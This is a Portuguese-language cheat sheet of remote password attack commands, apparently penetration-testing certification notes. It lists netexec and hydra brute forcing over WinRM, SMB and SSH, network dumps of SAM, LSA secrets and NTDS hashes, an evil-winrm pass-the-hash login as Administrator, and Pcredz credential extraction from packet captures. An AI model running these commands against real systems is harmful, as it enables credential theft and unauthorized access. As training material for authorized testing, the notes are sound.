> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/remote-password-attacks.md).

# Remote Password Attacks

* Ferramenta `Netexec` sobre WinRM para tentar descobrir por força bruta nomes de usuário e senhas especificados, hospedados em um alvo.

```
netexec winrm <ip> -u user.list -p password.list
```

* Utiliza o Netexec para enumerar compartilhamentos SMB em um destino usando um conjunto específico de credenciais.

```
netexec smb <ip> -u "user" -p "password" --shares
```

* Quebra de senha com `hydra` em um serviço específico

```
hydra -L user.list -P password.list <service>://<ip>
```

* Utiliza o Hydra em conjunto com uma lista de credenciais para tentar fazer login em um alvo através do serviço especificado.

```
hydra -C <user_pass.list> ssh://<IP>
```

* Utiliza o Netexec em conjunto com credenciais de administrador para extrair hashes de senhas armazenadas no SAM, através da rede.

```
netexec smb <ip> --local-auth -u <username> -p <password> --sam
```

* Utiliza o Netexec em conjunto com credenciais de administrador para extrair segredos LSA pela rede.

```
netexec smb <ip> --local-auth -u <username> -p <password> --lsa
```

* Utiliza o Netexec em conjunto com credenciais de administrador para extrair hashes do arquivo ntds através de uma rede.

```
netexec smb <ip> -u <username> -p <password> --ntds
```

* Utiliza o Evil-WinRM para estabelecer uma sessão do PowerShell com um alvo Windows usando um hash de usuário e senha. Este é um tipo de `Pass-The-Hash`ataque

```
evil-winrm -i <ip> -u Administrator -H "<passwordhash>"
```

* Extrair credenciais de uma captura de pacotes de rede

```
./Pcredz -f demo.pcapng -t -v
```
